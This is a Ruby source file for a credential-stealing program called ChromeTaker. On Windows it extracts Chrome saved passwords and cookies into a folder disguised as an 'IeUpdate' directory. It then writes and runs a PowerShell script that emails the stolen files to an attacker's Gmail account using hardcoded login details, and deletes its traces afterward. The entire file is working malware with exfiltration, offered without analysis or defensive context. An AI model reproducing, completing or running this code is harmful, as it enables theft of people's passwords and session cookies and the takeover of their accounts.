require 'open3'
require 'fileutils'
require_relative 'steal'
module ChromeTaker
	class << self
		Home = ENV["USERPROFILE"] + "/AppData/local/IeUpdate/"
		Steal = StealCreds.new
		def create_home_dir
			Dir.mkdir(ENV["USERPROFILE"] + '\\AppData\\local\\IeUpdate\\') unless Dir.exist?(ENV['HOME'] + '\\AppData\\local\\IeUpdate\\')
		end
		def steal_chrome
			Steal.chrome_pass
		end
		def steal_cookie
			Steal.chrome_cook
		end
		def web_miner
			puts
		end
		def gone_like_the_wind
			begin
				FileUtils.rm_r(ENV["USERPROFILE"] + "\\AppData\\local\\IeUpdate")
			rescue => e
				puts e
			end
		end
		def create_ps1
			f = File.open(ENV["USERPROFILE"] + "\\AppData\\local\\IeUpdate\\1.ps1", "w")
			f << '$emailSmtpServer = "smtp.gmail.com";$emailSmtpServerPort = "587";$emailSmtpUser = "1111nardski@gmail.com";$emailSmtpPass = "derby3333";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = "TacoBell <1111nardski@gmail.com>";$emailMessage.To.Add("1111nardski@gmail.com");$emailMessage.Body = "See attachments";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = "%UserProfile%\\AppData\\local\\IeUpdate\\Pass.txt";$emailMessage.Attachments.Add($attachment);$attachment2 = "%UserProfile%\\AppData\\local\\IeUpdate\\Cookie.txt";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);'.gsub("%UserProfile%\\AppData\\local\\IeUpdate\\", Home)
			f.close
		end
		def export_data
			command =  ENV["USERPROFILE"] + "\\AppData\\local\\IeUpdate\\1.ps1"
			system("Powershell.exe -File " +  command)
		end
	end
end
if Gem.win_platform?
	ChromeTaker.create_home_dir
	ChromeTaker.steal_chrome
	if File.exist?(ENV["USERPROFILE"] + '\\AppData\\local\\IeUpdate\\Pass.txt')
		ChromeTaker.steal_cookie
		if File.exist?(ENV["USERPROFILE"] + '\\AppData\\local\\IeUpdate\\Cookie.txt')
			ChromeTaker.create_ps1
			if File.exist?(ENV["USERPROFILE"] + '\\AppData\\local\\IeUpdate\\1.ps1')
				ChromeTaker.export_data
				ChromeTaker.gone_like_the_wind
			end
		end
	end
end